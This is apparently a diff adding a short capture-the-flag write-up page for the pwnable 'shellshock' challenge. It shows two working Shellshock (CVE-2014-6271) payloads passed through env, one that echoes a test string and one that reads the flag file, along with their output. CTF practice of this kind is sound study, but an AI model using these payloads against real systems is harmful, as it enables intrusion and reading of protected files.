@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+  </head>
+
+<h1 id="shellshock">shellshock</h1>
+<p>3rd April 2022</p>
+<pre><code>shellshock@pwnable<span class="hljs-symbol">:~</span>$ env x=<span class="hljs-string">'() { :;}; echo vulnerable'</span> ./shellshock
+vulnerable
+shock_me
+shellshock@pwnable<span class="hljs-symbol">:~</span>$ env x=<span class="hljs-string">'() { :;}; /bin/cat /home/shellshock/flag'</span> ./shellshock
+only <span class="hljs-keyword">if</span> I knew CVE-<span class="hljs-number">2014</span>-<span class="hljs-number">6271</span> ten years ago..!!
+Segmentation fault (core dumped)
+</code></pre>
